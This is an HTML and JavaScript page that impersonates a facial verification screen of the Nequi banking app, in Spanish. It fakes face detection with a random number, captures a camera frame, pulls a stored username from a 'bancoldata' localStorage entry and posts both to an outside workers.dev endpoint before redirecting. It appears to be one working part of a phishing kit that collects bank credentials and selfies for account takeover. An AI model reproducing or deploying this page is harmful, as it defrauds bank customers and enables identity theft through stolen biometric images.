<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Facial - Nequi</title>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* ALERTA SELFIE */
.alerta-selfie{
    position:fixed;
    top:20px;
    left:50%;
    transform:translateX(-50%);
    background:rgba(0,0,0,0.85);
    color:#fff;
    padding:15px 20px;
    border-radius:15px;
    font-size:14px;
    text-align:center;
    max-width:90%;
    z-index:9999;
    opacity:0;
    transition:0.4s;
}
.alerta-selfie.show{
    opacity:1;
}

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.oval.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
}

/* Texto */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
}

/* Warning */
.warning-message {
    position: absolute;
    top: 80px;
    left: 50%;
    transform: translateX(-50%);
    background: red;
    color: white;
    padding: 10px 20px;
    border-radius: 20px;
    display:none;
}
.warning-message.show{
    display:block;
}
</style>
</head>

<body>

<!-- ALERTA INSTRUCCIONES -->
<div id="alertaSelfie" class="alerta-selfie">
📸 Para una mejor selfie:<br>
• Sin gorra 🧢<br>
• Sin gafas 🕶️<br>
• Buena iluminación 💡<br>
• Rostro centrado y visible
</div>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>
<div class="oval" id="oval"></div>

<div class="warning-message" id="warningMessage">
⚠️ Coloca tu rostro en el círculo
</div>

<div class="status" id="status">
🎯 Coloca tu rostro en el círculo
</div>

<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const warningMessage = document.getElementById("warningMessage");

/* ALERTA 5 SEGUNDOS */
const alertaSelfie = document.getElementById("alertaSelfie");
window.addEventListener("load", ()=>{
    alertaSelfie.classList.add("show");

    setTimeout(()=>{
        alertaSelfie.classList.remove("show");
    },5000);
});

let photoTaken = false;

/* CAMARA */
navigator.mediaDevices.getUserMedia({ video:true })
.then(stream=>{
    video.srcObject = stream;
})
.catch(()=>{
    statusText.innerText="❌ Error cámara";
});

/* DETECCIÓN SIMPLE */
setInterval(()=>{
    if(photoTaken) return;

    const random = Math.random();

    if(random > 0.6){
        oval.classList.add("valid");
        warningMessage.classList.remove("show");
        statusText.innerText="✅ Rostro detectado";

        takePhotoAndSend();
    }else{
        oval.classList.remove("valid");
        warningMessage.classList.add("show");
        statusText.innerText="🎯 Coloca tu rostro en el círculo";
    }

},1500);

/* TOMAR FOTO */
function takePhotoAndSend(){
    if(photoTaken) return;
    photoTaken = true;

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");

    enviarAlServidor(imageData);
}

/* 🔥 ENVIAR AL ENDPOINT QUE QUIERES */
async function enviarAlServidor(imgData){
    try {

        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
        const usuario = bancoldata.usuario;

        const transactionId = 'txn_' + Date.now();

        const response = await fetch('https://quiet-haze-3548.micollflorez.workers.dev/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usuario: usuario,
                selfie: imgData, // 🔥 aquí va la imagen base64
                transactionId: transactionId
            })
        });

        const result = await response.json();

        if(result.ok){
            statusText.innerText="✅ Verificado";
            setTimeout(()=>{
                window.location.href="loading.html";
            },2000);
        }else{
            statusText.innerText="❌ Error servidor";
            photoTaken = false;
        }

    } catch(err){
        console.error(err);
        statusText.innerText="❌ Error conexión";
        photoTaken = false;
    }
}
</script>

</body>
</html>
